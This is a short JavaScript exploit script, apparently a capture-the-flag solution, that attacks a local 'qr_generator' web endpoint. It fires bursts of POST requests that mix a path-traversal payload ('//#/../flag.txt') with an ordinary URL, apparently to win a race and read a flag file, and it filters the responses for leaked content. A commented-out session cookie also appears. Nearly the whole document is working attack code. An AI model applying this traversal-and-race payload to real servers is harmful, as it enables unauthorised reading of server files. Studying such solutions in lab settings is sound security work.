const url = 'http://localhost:8000/qr_generator';
const a = '//#/../flag.txt';
const b = 'http://abcde';

function req(d) {
    return fetch(url, {
        method:'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            // "Cookie":"session=.eJwNx9ENwCAIBcBdmAB9aKDbgE-TztB09_b-7pGbcokpFvdqeRpmTMLCnR4s_BlOwHJHHkVmstSitrNrG6kVXd4P7nwUYQ.ZISJJA.JHEngz1EZ8JdxZALIerIEChBb6o"
        },
        body: `url=${d}`
    });
}


[a, b].forEach(r => req(r).then(s => s.text()).then(s => {
        const endIndex= s.indexOf('">')
        const news = s.slice(32,endIndex)

        if (!news.includes("iVBORw0KGgoAAAANSUhEUgAAASIAAAEiAQAAAAB1xeIbAAABjklEQVR4nO2ZQW6DMBBF3xSkLM0NchS4Wo/UG4Sj5ACV8DKSo9+F7Sqki3ZRAgkzK7Ce5K/ReBi+Tfwe49sfIHDKKaeccmrrlJVoYewAYl0ZVtW1C6qXJE1AP4ENNJIkzanH69oFFUuN28DVdALyMVhb176oeJAND91xr1R7vzB22KI7OlWj5j4IiABhysm//enaqvqXoEYzM+uA/twCXPOYs7aul6Zy3c+MhauVY7DMjk7NKRtime/1fpTqfO9zzgOonPFel9pkQgK4+r/VklQp7f5sQOyAaGjsJkHsajPaqvrnpnLujSBsPKYWwkRZo0mr6doPpRPUESealaeQsGFVXa9NoXlAkOiVABplo+e0VfXPTdWek6NJIraptPrYmff7Balc99XHbOpYHySoZqbX/bJU/PbqQ6qdP1x8xlyS+uGlEQ8CLkb/cXD/fknqZ+7DZ+7+ytbav+/o1D0VJJ0A6XzQ7Xi5sq5Xpri9GqQR/US+OISQ8G/tgtS9j6nyotn6VtU75ZRTTjn1V+oLa4iorgB09tgAAAAASUVORK5CYII=") && !news.includes("https://")) { console.log("news: "+s+"--")
            console.log("\n\n")
        }
}));


async function exploit(){
    // for (let i = 0; i < 100; i++) {
        await (async () =>
            await [b, b, b, b, b, a, b, b, b, b, b, b, b, a, b, b, b, b, b, b, b, b, b, b, b, b, a, a, a, a, a, a, a, a, b, a, a, a, a, b, b, b, b, b, b, b, b, b, a, b, b, b, b, b, b, b, b, a, b, b, b, a, a, a, a, a, b, a, a, a, a, a, a, b, a, b, b, b, b, b, b, b, b, b, b, b, b, b, b, b, b, b, a, b, b, b, b, b, b, a, b, a, a, a, a].forEach(r => req(r).then(s => s.text()).then(s => {
                const endIndex = s.indexOf('">')
                const news = s.slice(32, endIndex)
                if (!news.includes("iVBORw0KGgoAAAANSUhEUgAAASIAAAEiAQAAAAB1xeIbAAABjklEQVR4nO2ZQW6DMBBF3xSkLM0NchS4Wo/UG4Sj5ACV8DKSo9+F7Sqki3ZRAgkzK7Ce5K/ReBi+Tfwe49sfIHDKKaeccmrrlJVoYewAYl0ZVtW1C6qXJE1AP4ENNJIkzanH69oFFUuN28DVdALyMVhb176oeJAND91xr1R7vzB22KI7OlWj5j4IiABhysm//enaqvqXoEYzM+uA/twCXPOYs7aul6Zy3c+MhauVY7DMjk7NKRtime/1fpTqfO9zzgOonPFel9pkQgK4+r/VklQp7f5sQOyAaGjsJkHsajPaqvrnpnLujSBsPKYWwkRZo0mr6doPpRPUESealaeQsGFVXa9NoXlAkOiVABplo+e0VfXPTdWek6NJIraptPrYmff7Balc99XHbOpYHySoZqbX/bJU/PbqQ6qdP1x8xlyS+uGlEQ8CLkb/cXD/fknqZ+7DZ+7+ytbav+/o1D0VJJ0A6XzQ7Xi5sq5Xpri9GqQR/US+OISQ8G/tgtS9j6nyotn6VtU75ZRTTjn1V+oLa4iorgB09tgAAAAASUVORK5CYII=") && !news.includes("https://")) {
                    console.log("news: " + s + "--")
                    // console.log(news)
                    console.log("\n\n")
                }
            }).catch(e => console.log(e)))
        )()
    // }
}

exploit()